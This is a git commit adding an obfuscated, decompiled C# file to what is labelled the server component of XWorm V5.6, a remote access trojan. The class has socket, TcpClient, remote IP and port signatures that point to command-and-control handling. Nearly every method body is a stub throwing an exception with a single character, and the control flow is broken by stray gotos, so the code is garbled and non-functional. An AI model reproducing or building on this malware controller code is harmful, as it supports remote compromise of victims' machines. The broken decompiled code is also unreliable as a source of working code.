2da824779457fa98a515c790e5bbc42992ff20fc
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:51:15 +0400

    Forms48.cs

---
+++ XWorm V5.6/Server/Forms/Forms48.cs
@@ -0,0 +1,253 @@
+﻿using B55951D293DD740F7B3577CE2C48A401;
+using D7018A47F4B70814F7CC4EC07E909CEC;
+using DE71DAF09175D9F0B87B5C9ADD611E6D;
+using MEA9MCF25F24475D52DDBEE8F296A691;
+using Microsoft.VisualBasic.CompilerServices;
+using N1C62C6F47393CBF2355AN5E34307DD0;
+using System;
+using System.Net.Sockets;
+using System.Runtime.CompilerServices;
+using System.Windows.Forms;
+
+namespace M91M4ECFDDM3DME6A47137F5C799218A
+{
+  [StandardModule]
+  internal sealed class M5D21ECED72ME2727DF3B0M1DC743CC6
+  {
+    internal D0390509B52C44661FC1BBD32C057C4B \u0024VB\u0024ResumableLocal_Read\u00241;
+    internal Exception \u0024VB\u0024ResumableLocal_ex\u00242;
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    private void M39C2708DB5BCC77ABC31C35MM142CBM()
+    {
+      try
+      {
+      }
+      catch (Exception ex)
+      {
+label_2:
+        throw new Exception("ぅ");
+      }
+      goto label_2;
+    }
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public M5D21ECED72ME2727DF3B0M1DC743CC6(Socket CL) => throw new Exception("ろ");
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void M2D24647DCEE1DAA647EM29C71AE77C2(IAsyncResult ar) => throw new Exception("ざ");
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void A0971C0149162C7886175E2F76907783(byte[] Data) => throw new Exception("ず");
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void D05641AC065103FAEEE10E0BA673B822(IAsyncResult ar)
+    {
+      try
+      {
+      }
+      catch (Exception ex)
+      {
+label_2:
+        throw new Exception("ご");
+      }
+      goto label_2;
+    }
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void C760BA7A0F38ED10DE5D88A4EF74BAB3()
+    {
+      try
+      {
+      }
+      catch (Exception ex)
+      {
+label_2:;
+      }
+      goto label_2;
+      try
+      {
+      }
+      catch (Exception ex)
+      {
+label_4:;
+      }
+      goto label_4;
+      try
+      {
+      }
+      catch (Exception ex)
+      {
+label_6:
+        throw new Exception("ヱ");
+      }
+      goto label_6;
+    }
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public M5D21ECED72ME2727DF3B0M1DC743CC6(int localport, string remoteIP, string key)
+    {
+      try
+      {
+      }
+      catch (Exception ex)
+      {
+label_2:
+        throw new Exception("あ");
+      }
+      goto label_2;
+    }
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    private void MMB96A425D748E66C4820BMB4FF9A7MD()
+    {
+      try
+      {
+      }
+      catch (Exception ex)
+      {
+label_2:
+        throw new Exception("ろ");
+      }
+      goto label_2;
+    }
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public static void AD8C9D62A39495FC958C66896E1BC016()
+    {
+      try
+      {
+      }
+      catch (Exception ex)
+      {
+label_2:
+        throw new Exception("ら");
+      }
+      goto label_2;
+    }
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public M5D21ECED72ME2727DF3B0M1DC743CC6() => throw new Exception("ぽ");
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void MED8A46MCD6872D2F78MM3E7CFM66ME5(int int_2, int int_3, int Port) => throw new Exception("の");
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public static void FBB3CD7B6B29F6C8F3DB4C3F5E46A4EB()
+    {
+      try
+      {
+      }
+      catch (Exception ex)
+      {
+label_2:
+        throw new Exception("ぁ");
+      }
+      goto label_2;
+    }
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    private void CC940A869794A79636F03579B3697B04()
+    {
+      try
+      {
+      }
+      catch (Exception ex)
+      {
+label_2:
+        throw new Exception("む");
+      }
+      goto label_2;
+    }
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    private void MC994AD6F9065675M6741EDEBABB5D7E(TcpClient tcpClient_0)
+    {
+      try
+      {
+        try
+        {
+          try
+          {
+          }
+          finally
+          {
+label_4:
+            goto label_5;
+          }
+          goto label_4;
+        }
+        finally
+        {
+label_5:
+          goto label_6;
+        }
+      }
+      catch (Exception ex)
+      {
+label_6:
+        throw new Exception("は");
+      }
+    }
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    private void M556EDE41000E1235F5FM9E1C40FE1AA(object object_0) => throw new Exception("ぎ");
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public M5D21ECED72ME2727DF3B0M1DC743CC6() => throw new Exception("み");
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void MEDFMF4D4534M9BM065D60601529C4C7(int Port)
+    {
+      try
+      {
+      }
+      catch (Exception ex)
+      {
+label_2:
+        throw new Exception("ば");
+      }
+      goto label_2;
+    }
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void D53A73061F993CDEC19F452B857B1DB1(IAsyncResult ar)
+    {
+      try
+      {
+        try
+        {
+        }
+        catch (Exception ex)
+        {
+label_2:
+          goto label_3;
+        }
+        goto label_2;
+      }
+      finally
+      {
+label_3:
+        throw new Exception("ぇ");
+      }
+    }
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public M5D21ECED72ME2727DF3B0M1DC743CC6(byte[] _msgPack, string _id) => throw new Exception("っ");
+
+    static M5D21ECED72ME2727DF3B0M1DC743CC6() => U74CC57DU9422UA94U8D1CC4FD42D357.M2344294F532C329F9A39769413C42ME = (AE8C063EDF77AC603F8ED10C6ADACFB7) new D61DC9BD4E3D19AC32CBBA9128ADDEFC(Application.StartupPath + B2673BC82C5B1B0F6BAC43DC322CA48B.WL.LFBEE5D4C59E4EEAA400EB62CE4E2934("]FdnHQ/e`u", (object) null));
+
+    public struct SHFILEINFO
+    {
+      public static int H37C083CFEA353E364876C7465B06779;
+      public static int EDDB99D50446D4DF0AD91A8873547EB9;
+      public static int H2HHHHCB25DFEB3F352FH4C569249E25;
+      public static int B18877E145EE9E7B0A8D10996F0045F6;
+      public static int B840F8C49B9915FDEA8BD08EB7CCD78F;
+    }
+
+    public enum IconSize
+    {
+    }
+  }
+}
